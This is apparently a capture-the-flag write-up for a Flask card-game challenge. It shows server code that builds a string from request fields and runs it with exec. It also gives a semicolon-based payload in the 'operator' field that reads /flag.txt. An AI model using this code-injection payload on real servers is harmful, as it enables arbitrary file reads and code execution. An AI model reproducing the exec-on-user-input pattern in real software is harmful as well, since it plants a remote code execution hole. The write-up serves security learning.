# Evaluation Deck
For this challenge I forget to take screenshots during the event so I am running it locally for this writeup. We are given the address of a website and the source code which if a flask web server.

![webpage](/hack_the_boo/evaluation_deck/evaluation_deck.png)

After playing around with the card game for a bit I decided to dig around through the source code and see what stood out. After poking around I saw that an api was exposed, I took my a while to reach it as I forgot to add /api/ before trying to access the endpoints.

### routes.py
```
from flask import Blueprint, render_template, request
from application.util import response

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

The red flag for me was in the try section where a formatted string is turned into code to execute.
```
code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}
```
All these values a read from a post request, *current_health* and *attack_power* are cast to integers so we need to hide our payload in *operator*. Whatever is stored is in *result* is what gets sent back to us so we need to get the flag stored there. If we sneak some ; in there we can execute multiple statements. After some trial and error I came up with that operator should be:
```
"; f = open('/flag.txt','r'); result = f.read();"
```
The last step was to send it to the server, initally I tried using curl.
![bad curl](/hack_the_boo/evaluation_deck/badrequest.PNG)
curl did not like having single quotes in my payload so I tried with postman instead and had success.
![postman](/hack_the_boo/evaluation_deck/postman.PNG)


After reading stackoverflow I figured I needed to use escape characters!
![curl](/hack_the_boo/evaluation_deck/curl.PNG)
And was able to get the flag using the terminal like a champ :)
